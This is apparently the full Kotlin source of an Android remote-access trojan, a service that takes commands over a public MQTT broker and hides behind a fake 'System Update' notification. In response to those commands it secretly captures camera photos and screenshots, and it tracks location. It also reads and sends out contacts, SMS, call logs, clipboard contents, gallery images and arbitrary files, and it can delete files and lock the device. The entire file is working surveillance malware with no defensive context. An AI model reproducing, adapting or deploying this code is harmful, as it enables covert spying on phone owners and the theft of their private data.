package com.ghost.target

import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.*
import android.graphics.*
import android.hardware.camera2.*
import android.location.LocationManager
import android.media.*
import android.media.projection.MediaProjection
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.*
import android.provider.*
import android.speech.tts.TextToSpeech
import android.util.Base64
import android.view.Gravity
import android.view.WindowManager
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import org.eclipse.paho.client.mqttv3.*
import org.eclipse.paho.client.mqttv3.persist.MemoryPersistence
import java.io.*
import java.util.Locale
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class TargetService : Service() {
    companion object {
        var instance: TargetService? = null
        var mqttClient: MqttClient? = null
        const val ROOM_ID = "GHOST_SECRET_ROOM_99"
        const val BROKER = "tcp://broker.hivemq.com:1883"
        fun sendLog(t: String) { 
            try { mqttClient?.publish("$ROOM_ID/res", MqttMessage(t.toByteArray())) } catch (e: Exception) {} 
        }
    }

    private var cameraId: String? = null
    private var mediaProjection: MediaProjection? = null
    private var mediaPlayer: MediaPlayer? = null
    private var tts: TextToSpeech? = null

    override fun onCreate() {
        super.onCreate()
        instance = this
        startForeground(1, buildNotif())
        cameraId = (getSystemService(CAMERA_SERVICE) as CameraManager).cameraIdList.firstOrNull()
        tts = TextToSpeech(this) { if (it == TextToSpeech.SUCCESS) tts?.language = Locale.getDefault() }
        
        try {
            mqttClient = MqttClient(BROKER, MqttClient.generateClientId(), MemoryPersistence())
            val opt = MqttConnectOptions().apply { isAutomaticReconnect = true; isCleanSession = true; maxInflight = 200 }
            mqttClient?.connect(opt)
            mqttClient?.subscribe("$ROOM_ID/cmd", 1) { _, msg -> handle(String(msg.payload).trim()) }
        } catch (e: Exception) { e.printStackTrace() }
    }

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int = START_STICKY
    override fun onBind(i: Intent?): IBinder? = null

    private fun buildNotif(): Notification {
        val ch = "g_ch"
        val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= 26) nm.createNotificationChannel(NotificationChannel(ch, "Sys", NotificationManager.IMPORTANCE_LOW))
        return NotificationCompat.Builder(this, ch).setContentTitle("System Update").setContentText("Updating...").setSmallIcon(android.R.drawable.stat_notify_sync).build()
    }

    fun setMediaProjection(mp: MediaProjection) { this.mediaProjection = mp }

    private fun handle(cmd: String) {
        when {
            cmd == "photo" -> CoroutineScope(Dispatchers.IO).launch { takePhoto(false) }
            cmd == "photo_front" -> CoroutineScope(Dispatchers.IO).launch { takePhoto(true) }
            cmd == "screenshot" -> takeScreenshot()
            cmd == "ghost_sound" -> playGhostSound()
            cmd == "ring" -> playRing()
            cmd == "stop_audio" -> { mediaPlayer?.release(); mediaPlayer = null; sendLog("Stopped") }
            cmd.startsWith("tts:") -> { tts?.speak(cmd.substringAfter("tts:"), TextToSpeech.QUEUE_FLUSH, null, "g"); sendLog("Speaking") }
            cmd == "toast_default" -> Handler(Looper.getMainLooper()).post { Toast.makeText(this, "System Error!", Toast.LENGTH_SHORT).show() }
            cmd.startsWith("toast:") -> Handler(Looper.getMainLooper()).post { Toast.makeText(this, cmd.substringAfter("toast:"), Toast.LENGTH_LONG).show() }
            cmd == "torch_on" -> setTorch(true)
            cmd == "torch_off" -> setTorch(false)
            cmd == "vibrate" -> vibratePhone()
            cmd == "volume_max" -> setVol(100)
            cmd == "volume_mute" -> setVol(0)
            cmd == "lock" -> lockScreen()
            cmd.startsWith("open:") -> startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(cmd.substringAfter("open:"))).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
            cmd.startsWith("start_app:") -> startApp(cmd.substringAfter("start_app:"))
            cmd == "loc" -> getLocation()
            cmd == "gps_track" -> trackLocation()
            cmd == "contacts" -> sendLog(getContacts())
            cmd == "sms" -> sendLog(getSms())
            cmd == "calls" -> sendLog(getCalls())
            cmd == "apps" -> sendLog(getApps())
            cmd == "device" -> sendLog("Model: ${Build.MODEL}\nOS: ${Build.VERSION.RELEASE}")
            cmd == "wifi" -> sendLog(getWifi())
            cmd == "battery" -> sendLog(getBattery())
            cmd == "clip" -> sendLog(getClipboard())
            cmd == "gallery" -> sendLog(getGallery())
            cmd.startsWith("dl_gallery:") -> downloadGallery(cmd.substringAfter("dl_gallery:"))
            cmd.startsWith("ls:") -> sendLog(listFiles(cmd.substringAfter("ls:")))
            cmd.startsWith("read:") -> sendLog(readFile(cmd.substringAfter("read:")))
            cmd.startsWith("del:") -> deleteFile(cmd.substringAfter("del:"))
            cmd.startsWith("dl:") -> downloadFile(cmd.substringAfter("dl:"))
            cmd.startsWith("mkdir:") -> createDir(cmd.substringAfter("mkdir:"))
            cmd.startsWith("rename:") -> { 
                val p = cmd.substringAfter("rename:").split("|")
                if (p.size == 2) renameFile(p[0], p[1]) 
            }
        }
    }

    private suspend fun takePhoto(front: Boolean) = suspendCoroutine<Unit> { cont ->
        val cm = getSystemService(CAMERA_SERVICE) as CameraManager
        val id = if (front) cm.cameraIdList.firstOrNull { cm.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT } else cameraId
        
        if (id == null) {
            sendLog("Camera not found")
            cont.resume(Unit)
        } else {
            try {
                val size = cm.getCameraCharacteristics(id).get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!.getOutputSizes(ImageFormat.JPEG)?.firstOrNull()
                if (size == null) {
                    cont.resume(Unit)
                } else {
                    val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
                    reader.setOnImageAvailableListener({ r ->
                        val img = r.acquireLatestImage()
                        if (img != null) {
                            val buf = img.planes[0].buffer
                            val b = ByteArray(buf.remaining())
                            buf.get(b)
                            img.close()
                            r.close()
                            val bmp = Bitmap.createScaledBitmap(BitmapFactory.decodeByteArray(b, 0, b.size), 640, 480, true)
                            val baos = ByteArrayOutputStream()
                            bmp.compress(Bitmap.CompressFormat.JPEG, 50, baos)
                            sendLog("img:" + Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP))
                            cont.resume(Unit)
                        }
                    }, Handler(Looper.getMainLooper()))
                    
                    cm.openCamera(id, object : CameraDevice.StateCallback() {
                        override fun onOpened(dev: CameraDevice) {
                            dev.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(s: CameraCaptureSession) {
                                    s.capture(dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply { addTarget(reader.surface) }.build(), null, null)
                                    dev.close()
                                }
                                override fun onConfigureFailed(s: CameraCaptureSession) {
                                    dev.close()
                                    cont.resume(Unit)
                                }
                            }, null)
                        }
                        override fun onDisconnected(dev: CameraDevice) { dev.close() }
                        override fun onError(dev: CameraDevice, e: Int) {
                            dev.close()
                            cont.resume(Unit)
                        }
                    }, null)
                }
            } catch (e: Exception) {
                cont.resume(Unit)
            }
        }
    }

    private fun takeScreenshot() {
        val mp = mediaProjection
        if (mp == null) {
            sendLog("Screenshot permission not granted")
        } else {
            val dm = resources.displayMetrics
            val w = dm.widthPixels; val h = dm.heightPixels; val d = dm.densityDpi
            val reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 1)
            val vd = mp.createVirtualDisplay("G", w, h, d, android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, null)
            Handler(Looper.getMainLooper()).postDelayed({
                val img = reader.acquireLatestImage()
                if (img != null) {
                    val p = img.planes[0]; val buf = p.buffer; val ps = p.pixelStride; val rs = p.rowStride
                    val bmp = Bitmap.createBitmap(w + (rs - ps * w) / ps, h, Bitmap.Config.ARGB_8888)
                    bmp.copyPixelsFromBuffer(buf); img.close(); vd.release(); reader.close()
                    val baos = ByteArrayOutputStream()
                    Bitmap.createBitmap(bmp, 0, 0, w, h).compress(Bitmap.CompressFormat.JPEG, 40, baos)
                    sendLog("screen:" + Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP))
                }
            }, 500)
        }
    }

    private fun playGhostSound() {
        try {
            val am = getSystemService(AUDIO_SERVICE) as AudioManager
            am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0)
            val sr = 8000
            val ns = (5.0 * sr).toInt()
            val s = DoubleArray(ns)
            val gs = ByteArray(2 * ns)
            for (i in 0 until ns) s[i] = Math.sin(2 * Math.PI * i / (sr / 50.0))
            var idx = 0
            for (v in s) { 
                val vs = (v * 32767).toInt().toShort()
                gs[idx++] = (vs.toInt() and 0x00ff).toByte()
                gs[idx++] = ((vs.toInt() and 0xff00) ushr 8).toByte() 
            }
            val f = File(cacheDir, "ghost.wav")
            val fos = FileOutputStream(f)
            val header = byteArrayOf(
                82.toByte(), 73.toByte(), 70.toByte(), 70.toByte(), (36 + ns * 2).toByte(), 0.toByte(), 0.toByte(), 0.toByte(),
                87.toByte(), 65.toByte(), 86.toByte(), 69.toByte(), 102.toByte(), 109.toByte(), 116.toByte(), 32.toByte(),
                16.toByte(), 0.toByte(), 0.toByte(), 0.toByte(), 1.toByte(), 0.toByte(), 1.toByte(), 0.toByte(),
                (sr and 0xff).toByte(), ((sr shr 8) and 0xff).toByte(), 0.toByte(), 0.toByte(), 0.toByte(), 0.toByte(),
                2.toByte(), 0.toByte(), 16.toByte(), 0.toByte(), 100.toByte(), 97.toByte(), 116.toByte(), 97.toByte(),
                (ns * 2).toByte(), 0.toByte(), 0.toByte(), 0.toByte()
            )
            fos.write(header)
            fos.write(gs)
            fos.close()
            mediaPlayer?.release()
            mediaPlayer = MediaPlayer().apply { setDataSource(f.absolutePath); prepare(); start() }
            sendLog("Ghost Sound Playing")
        } catch (e: Exception) { sendLog("err: ${e.message}") }
    }

    private fun playRing() {
        val am = getSystemService(AUDIO_SERVICE) as AudioManager
        am.setStreamVolume(AudioManager.STREAM_RING, am.getStreamMaxVolume(AudioManager.STREAM_RING), 0)
        mediaPlayer?.release()
        mediaPlayer = MediaPlayer.create(this, Settings.System.DEFAULT_RINGTONE_URI).apply { isLooping = false; start() }
        sendLog("Ringing")
    }

    private fun setTorch(on: Boolean) { try { (getSystemService(CAMERA_SERVICE) as CameraManager).setTorchMode(cameraId ?: return, on); sendLog(if (on) "ON" else "OFF") } catch (e: Exception) {} }
    private fun vibratePhone() { val v = getSystemService(VIBRATOR_SERVICE) as Vibrator; if (Build.VERSION.SDK_INT >= 26) v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE)); sendLog("Vibrate") }
    private fun setVol(pct: Int) { val am = getSystemService(AUDIO_SERVICE) as AudioManager; am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC) * pct / 100, 0); sendLog("Volume $pct%") }
    private fun lockScreen() { val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager; if (dpm.isAdminActive(ComponentName(this, AdminReceiver::class.java))) { dpm.lockNow(); sendLog("Locked") } }
    private fun startApp(pkg: String) { val i = packageManager.getLaunchIntentForPackage(pkg); if (i != null) { startActivity(i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)); sendLog("$pkg") } else sendLog("not found") }
    private fun getLocation() { val lm = getSystemService(LOCATION_SERVICE) as LocationManager; val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER); if (loc != null) sendLog("${loc.latitude}, ${loc.longitude}") else sendLog("No location") }
    private fun trackLocation() { CoroutineScope(Dispatchers.IO).launch { val lm = getSystemService(LOCATION_SERVICE) as LocationManager; for (i in 1..5) { val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER); if (loc != null) sendLog("Track $i: ${loc.latitude}, ${loc.longitude}"); delay(5000) } } }
    private fun getContacts(): String { val sb = StringBuilder("Kontak:\n"); var c = 0; contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER), null, null, null)?.use { while (it.moveToNext() && c < 20) { sb.append("${it.getString(0)}: ${it.getString(1)}\n"); c += 1 } }; return if (c == 0) "Kosong" else sb.toString() }
    private fun getSms(): String { val sb = StringBuilder("SMS:\n"); var c = 0; contentResolver.query(Telephony.Sms.CONTENT_URI, arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY), null, null, Telephony.Sms.DATE + " DESC")?.use { while (it.moveToNext() && c < 20) { sb.append("${it.getString(0)}: ${it.getString(1)?.take(50)}\n"); c += 1 } }; return if (c == 0) "Kosong" else sb.toString() }
    private fun getCalls(): String { val sb = StringBuilder("Call Log:\n"); var c = 0; contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE, CallLog.Calls.DURATION), null, null, CallLog.Calls.DATE + " DESC")?.use { while (it.moveToNext() && c < 20) { sb.append("${it.getString(0)} | ${it.getLong(2)}s\n"); c += 1 } }; return if (c == 0) "Kosong" else sb.toString() }
    private fun getApps(): String { val sb = StringBuilder("Apps:\n"); var c = 0; packageManager.getInstalledPackages(0).forEach { if (c < 30) { sb.append("${it.packageName}\n"); c += 1 } }; return sb.toString() }
    private fun getWifi(): String { val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager; @Suppress("DEPRECATION") val i = wm.connectionInfo; return "SSID: ${i.ssid}\nIP: ${i.ipAddress}" }
    private fun getBattery(): String { val bm = getSystemService(BATTERY_SERVICE) as BatteryManager; return "Battery: ${bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)}%" }
    private fun getClipboard(): String { val cm = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager; val c = cm.primaryClip; return if (c == null || c.itemCount == 0) "Kosong" else "${c.getItemAt(0).text}" }
    private fun getGallery(): String { val dir = File("/sdcard/DCIM/Camera"); val files = dir.listFiles { f -> f.isFile && f.name.endsWith(".jpg") }?.sortedByDescending { it.lastModified() }?.take(15); if (files.isNullOrEmpty()) return "Galeri kosong"; val sb = StringBuilder("Galeri (15 terakhir):\n"); files.forEach { sb.append("${it.name} (${it.length()/1024} KB)\n") }; return sb.toString() }
    private fun downloadGallery(name: String) { val f = File("/sdcard/DCIM/Camera/$name"); if (f.exists()) sendLog("file:$name|" + Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)) else sendLog("File not found") }
    private fun listFiles(path: String): String { val f = File(path); if (!f.exists()) return "Not found"; val sb = StringBuilder("$path:\n"); var c = 0; f.listFiles()?.forEach { if (c < 20) { sb.append(if (it.isDirectory) "[D] " else "[F] ").append(it.name).append("\n"); c += 1 } }; return sb.toString() }
    private fun readFile(path: String): String { val f = File(path); if (!f.exists()) return "File not found"; return try { "$path:\n${f.readText()}" } catch (e: Exception) { "${e.message}" } }
    private fun deleteFile(path: String): String { val f = File(path); return if (f.exists() && f.delete()) "Deleted" else "Failed" }
    private fun downloadFile(path: String) { val f = File(path); if (!f.exists()) return sendLog("Not found"); if (f.length() > 5*1024*1024) return sendLog("File > 5MB"); sendLog("file:${f.name}|" + Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)) }
    private fun createDir(path: String) { val f = File(path); if (f.mkdirs()) sendLog("Created: $path") else sendLog("Failed") }
    private fun renameFile(from: String, to: String) { val f1 = File(from); val f2 = File(to); if (f1.renameTo(f2)) sendLog("Renamed") else sendLog("Failed") }
}
